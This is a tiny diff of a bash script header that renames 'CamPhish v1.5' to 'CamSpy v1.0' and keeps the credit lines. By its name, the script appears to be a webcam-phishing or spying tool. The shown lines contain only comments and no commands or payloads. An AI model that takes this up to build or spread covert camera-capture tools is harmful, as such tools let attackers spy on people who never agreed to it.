@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.5
+# CamSpy v1.0
 # Powered by Coding Arena
 # Credits goes to Pawan Raut[github.com/Pavan-123-tech/]
 
